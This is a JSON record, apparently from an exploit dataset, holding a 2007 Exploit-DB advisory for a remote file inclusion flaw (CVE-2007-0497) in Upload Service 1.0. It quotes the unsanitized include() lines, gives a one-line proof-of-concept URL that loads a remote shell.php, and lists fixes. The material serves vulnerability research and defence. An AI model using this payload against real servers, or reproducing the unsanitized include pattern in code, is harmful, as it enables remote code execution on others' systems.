{
  "id": "3174",
  "title": "Upload Service 1.0 - &#039;top.php?maindir&#039; Remote File Inclusion",
  "cve": "CVE-2007-0497",
  "vuln_type": "file_upload",
  "code": "------------------------------------------------------------------------------------\r\n[ECHO_ADV_62$2007] Upload Service 1.0 remote file inclusion\r\n------------------------------------------------------------------------------------\r\n\r\nAuthor : Ahmad Muammar W.K (a.k.a) y3dips\r\nDate Found : January, 21st 2007\r\nLocation : Indonesia, Jakarta\r\nweb : http://echo.or.id/adv/adv62-y3dips-2007.txt\r\nCritical Lvl : Critical\r\n------------------------------------------------------------------------------------\r\n\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nApplication : Upload Service\r\nversion : 1.0\r\nURL : http://bild-bearbeiten.de/\r\nDownload-path : http://bild-bearbeiten.de/scripts/upload_service_1.0.zip\r\n\r\n---------------------------------------------------------------------------\r\n\r\n1. Install directory are not being remove after installation process\r\n2. Variables \"$maindir\" in top.php are not properly sanitized.\r\n\r\n---------------top.php--------------------------------\r\n...\r\ninclude($maindir.\"config.php\");\r\ninclude($maindir.\"functions/error.php\");\r\n...\r\n------------------------------------------------------------------\r\n\r\n\r\nWhen register_globals=on and allow_fopenurl=on an attacker can exploit\r\nthis vulnerability with a simple php injection script.\r\n\r\nPoc/Exploit:\r\n~~~~~~~~~\r\n\r\nhttp://127.0.0.1/upload/top.php?maindir=http://127.0.0.1/shell.php?\r\n\r\nSolution:\r\n~~~~~~\r\n- Remember to remove your install directory and change config.php permission\r\n- Simply Sanitize variable $maindir on affected files. (eg. $maindir=\" \";)\r\n- Turn off register_globals\r\n\r\nNotification:\r\n~~~~~~~~~\r\n\r\nvendor not contact yet\r\n\r\n---------------------------------------------------------------------------\r\nShoutz:\r\n~~~~\r\n~ my lovely ana\r\n~ k-159 (my greatest brotha), the_day (young evil thinker), and all echo staff\r\n~ newbie_hacker@yahoogroups.com\r\n~ #e-c-h-o @irc.dal.net\r\n\r\n---------------------------------------------------------------------------\r\nContact:\r\n~~~~~\r\n\r\ny3dips|| echo|staff || y3dips[at]gmail[dot]com\r\nHomepage: http://y3dips.echo.or.id/\r\n\r\n-------------------------------- [ EOF ] ----------------------------------\r\n\r\n# milw0rm.com [2007-01-21]",
  "url": "https://www.exploit-db.com/exploits/3174"
}